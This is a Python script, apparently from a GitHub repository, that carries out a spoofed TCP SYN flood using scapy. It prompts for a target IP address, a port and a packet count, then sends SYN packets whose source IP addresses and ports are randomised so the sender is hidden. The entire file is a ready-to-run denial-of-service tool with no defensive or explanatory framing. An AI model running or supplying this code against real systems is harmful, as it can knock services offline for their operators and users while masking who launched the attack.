# Source: https://github.com/Giannisgre/Spoofed-SYNFlood



import socket
from scapy.all import *

def main():
    target_ip_address, target_port, no_of_packets_to_send = readDestinationInfo()
    SpoofedSYNFlood(target_ip_address, target_port, no_of_packets_to_send)
    
def readDestinationInfo():
    print("Provide Destination information.")
    target_ip_address = input("Target IP Address: ")
    target_port = input("Target Port: ")
    no_of_packets_to_send = int(input("Number of packets to send: "))
    return target_ip_address, target_port, no_of_packets_to_send

def SpoofedSYNFlood(target_ip_address, target_port, no_of_packets_to_send):
    for packet in range(no_of_packets_to_send):
        #Craft a custom ip header with a randomized IP address as source & the destination IP
        ip_header = IP(src = RandIP(), dst = target_ip_address)
        #Craft a custom tcp header for SYN packet with randomized source port & the destination port
        tcp_header = TCP(flags = "S", sport = RandShort(), dport = int(target_port))
        #Stack the headers using the / operator to craft the packet to send
        crafted_packet = ip_header/tcp_header
        try:
            send(crafted_packet)
        except Exception as e:
            print(e)

if __name__ == "__main__":
    main()
